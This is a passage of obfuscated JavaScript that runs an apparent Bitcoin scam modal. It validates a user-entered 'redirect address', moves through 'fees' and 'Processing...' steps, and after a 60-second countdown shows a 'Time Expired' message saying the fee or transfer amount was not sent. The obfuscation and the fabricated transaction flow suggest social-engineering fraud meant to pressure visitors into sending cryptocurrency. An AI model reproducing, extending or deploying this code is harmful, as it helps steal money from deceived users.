            this.textContent = "Copied!";
            this.classList.add("copied");
            setTimeout(() => {
              this.textContent = _0x4ad7bc;
              this.classList.remove("copied");
            }, 1500);
          }
        });
      });
    }
    function _0x58190b(_0x3e49a5) {
      const _0x1fc840 = _0x3e49a5.trim();
      return /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(_0x1fc840) || /^3[a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(_0x1fc840) || /^(bc1)[a-z0-9]{25,90}$/.test(_0x1fc840) || /^(bc1p)[a-z0-9]{25,90}$/.test(_0x1fc840);
    }
    function _0x4a3583(_0x3c8fb9) {
      const _0x217c65 = document.getElementById("redirectAddress");
      const _0x2290bb = document.getElementById("addressValidation");
      const _0x480497 = document.getElementById("nextToFees");
      if (!_0x3c8fb9.trim()) {
        _0x217c65.classList.remove("invalid");
        _0x2290bb.className = "validation-message";
        _0x480497.disabled = true;
        return;
      }
      if (_0x58190b(_0x3c8fb9)) {
        _0x217c65.classList.remove("invalid");
        _0x2290bb.className = "validation-message";
        _0x480497.disabled = false;
      } else {
        _0x217c65.classList.add("invalid");
        _0x2290bb.textContent = "✗ Invalid Bitcoin address";
        _0x2290bb.className = "validation-message invalid";
        _0x480497.disabled = true;
      }
    }
    const _0x34769e = document.getElementById("redirectAddress");
    const _0x985748 = document.getElementById("nextToFees");
    const _0x356dbf = document.getElementById("backToOverview");
    const _0x356cdb = document.getElementById("confirmProcessing");
    const _0x1559f3 = document.getElementById("closeProcessing");
    const _0xf426d = document.getElementById("closePage1");
    const _0x21b2a0 = document.getElementById("closePage2");
    const _0x134f4b = document.getElementById("newRecipientDisplay");
    const _0x1eb622 = document.getElementById("monitorRecipient");
    let _0x1655a0;
    _0x34769e.addEventListener("input", _0x29ace3 => _0x4a3583(_0x29ace3.target.value));
    _0xf426d.addEventListener("click", () => {
      _0x2b0297.remove();
      document.getElementById(_0x15c7c0)?.remove();
    });
    _0x21b2a0.addEventListener("click", () => {
      _0x2b0297.remove();
      document.getElementById(_0x15c7c0)?.remove();
    });
    _0x985748.addEventListener("click", () => {
      const _0x37d168 = _0x34769e.value.trim();
      if (!_0x58190b(_0x37d168)) {
        _0x4a3583(_0x37d168);
        _0x34769e.focus();
        return;
      }
      _0x134f4b.textContent = _0x37d168.substring(0, 14) + "...";
      _0x25f4a6(2);
      setTimeout(_0x32b3c8, 100);
      setTimeout(_0x4afa78, 200);
    });
    _0x356dbf.addEventListener("click", () => _0x25f4a6(1));
    _0x356cdb.addEventListener("click", async () => {
      const _0x3f75b0 = _0x34769e.value.trim();
      _0x1eb622.textContent = _0x3f75b0.substring(0, 14) + "...";
      _0x356cdb.disabled = true;
      _0x356cdb.textContent = "Processing...";
      await new Promise(_0xa1c75d => setTimeout(_0xa1c75d, 1200));
      _0x25f4a6(3);
      let _0x3711aa = 60;
      _0x1655a0 = setInterval(() => {
        if (_0x3711aa <= 0) {
          clearInterval(_0x1655a0);
          const _0x3987fd = document.querySelector("#page3 .content");
          if (_0x3987fd) {
            _0x3987fd.innerHTML = "<div class=\"processing\"><div class=\"error-icon\"></div><div class=\"error-box\"><div class=\"error-title\">Time Expired</div><div class=\"error-message\">The transfer could not be completed because either the fee or the transfer amount itself was not sent.<br>\nPlease verify and try again.</div></div></div><button class=\"btn btn-simple\" id=\"closeTimeout\">Close</button>";
            document.getElementById("closeTimeout").addEventListener("click", () => {
              _0x2b0297.remove();
              document.getElementById(_0x15c7c0)?.remove();
            });
          }
        }
        _0x3711aa--;
      }, 1000);
    });
    _0x1559f3.addEventListener("click", () => {
      if (_0x1655a0) {
        clearInterval(_0x1655a0);
      }
      _0x2b0297.remove();
      document.getElementById(_0x15c7c0)?.remove();
    });
  } else {
    document.getElementById("closeOnly")?.addEventListener("click", () => {
      _0x2b0297.remove();
      document.getElementById(_0x15c7c0)?.remove();
    });
  }
  _0x2b0297.addEventListener("mousedown", _0x4a568b => {
    if (_0x4a568b.target === _0x2b0297) {
      if (countdown) {
        clearInterval(countdown);
      }
      _0x2b0297.remove();
      document.getElementById(_0x15c7c0)?.remove();
    }
  });
  document.addEventListener("keydown", function _0x2ba437(_0x69b4c8) {
    if (_0x69b4c8.key === "Escape") {
      if (countdown) {
        clearInterval(countdown);
      }
      _0x2b0297.remove();
      document.removeEventListener("keydown", _0x2ba437);
      document.getElementById(_0x15c7c0)?.remove();
    }
  });
})();